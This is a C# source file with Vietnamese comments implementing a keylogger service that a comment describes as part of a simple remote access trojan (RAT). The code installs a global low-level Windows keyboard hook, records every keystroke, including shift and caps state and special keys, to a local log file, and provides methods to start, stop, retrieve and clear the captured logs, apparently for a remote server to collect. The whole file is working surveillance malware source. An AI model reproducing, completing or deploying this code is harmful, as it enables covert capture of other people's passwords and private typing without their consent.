using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading;

namespace WebSocketTest // Đổi namespace cho trùng với project Server
{
    public static class KeyLoggerService
    {
        private static string logPath = "fileKeyLog.txt";
        private static IntPtr _hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static bool _isRunning = false;

        // Các hàm API của Windows
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // --- HÀM ĐIỀU KHIỂN ---

        public static void Start()
        {
            if (_isRunning) return; // Đang chạy rồi thì thôi

            // Chạy hook trên một luồng riêng biệt để không làm đơ Server
            Thread hookThread = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                _isRunning = true;
                Application.Run(); // Vòng lặp giữ hook sống
            });
            hookThread.SetApartmentState(ApartmentState.STA);
            hookThread.IsBackground = true;
            hookThread.Start();
        }

        public static void Stop()
        {
            if (_isRunning && _hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
                _isRunning = false;
                // Lưu ý: Thread chứa Application.Run() sẽ tự kết thúc khi App đóng hoặc Hook gỡ (tùy ngữ cảnh), 
                // nhưng với RAT đơn giản ta chỉ cần Unhook là ngừng ghi.
            }
        }

        public static string GetLogs()
        {
            if (File.Exists(logPath))
            {
                try 
                {
                    // Đọc file log và trả về nội dung
                    return File.ReadAllText(logPath);
                }
                catch { return ""; }
            }
            return "";
        }

        public static void ClearLogs()
        {
             if (File.Exists(logPath)) File.WriteAllText(logPath, "");
        }

        // --- HÀM XỬ LÝ (GIỮ NGUYÊN LOGIC CŨ CỦA BẠN) ---

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                bool caps = Control.IsKeyLocked(Keys.CapsLock);

                // Mở file để ghi (Append)
                try {
                    using (StreamWriter sw = File.AppendText(logPath))
                    {
                        string key = ((Keys)vkCode).ToString();

                        // Xử lý sơ bộ một số phím (Logic cũ của bạn khá dài, đây là bản rút gọn demo)
                        // Bạn có thể copy lại khối Switch Case khổng lồ cũ vào đây nếu muốn chi tiết
                        switch ((Keys)vkCode)
                        {
                            case Keys.Space: sw.Write(" "); break;
                            case Keys.Return: sw.Write("[ENTER]"); break;
                            case Keys.Back: sw.Write("[BS]"); break;
                            case Keys.Tab: sw.Write("[TAB]"); break;
                            default:
                                // Logic xử lý chữ hoa/thường đơn giản
                                if (key.Length == 1) // Ký tự A-Z, 0-9
                                {
                                    bool isUpper = shift ^ caps; // XOR: Shift hoặc Caps -> Hoa, cả 2 -> Thường
                                    sw.Write(isUpper ? key.ToUpper() : key.ToLower());
                                }
                                else
                                {
                                    sw.Write($"[{key}]");
                                }
                                break;
                        }
                    }
                } catch { /* Bỏ qua lỗi ghi file */ }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}